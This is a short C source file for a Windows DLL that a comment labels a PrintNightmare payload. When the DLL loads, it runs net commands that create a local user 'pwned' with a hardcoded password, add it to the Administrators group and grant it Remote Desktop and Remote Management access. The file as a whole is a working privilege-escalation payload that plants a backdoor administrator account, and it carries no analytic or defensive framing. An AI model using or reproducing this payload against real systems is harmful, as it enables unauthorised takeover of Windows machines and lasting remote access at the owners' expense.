#include <windows.h>

// PrintNightmare payload DLL
// Adds user "pwned" with password "Pwn3d!@#123" to Administrators group

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Add user using net commands (runs as SYSTEM)
        WinExec("cmd.exe /c net user pwned Pwn3d!@#123 /add", 0);
        WinExec("cmd.exe /c net localgroup Administrators pwned /add", 0);
        // Also enable RDP for the user
        WinExec("cmd.exe /c net localgroup \"Remote Desktop Users\" pwned /add", 0);
        WinExec("cmd.exe /c net localgroup \"Remote Management Users\" pwned /add", 0);
    }
    return TRUE;
}
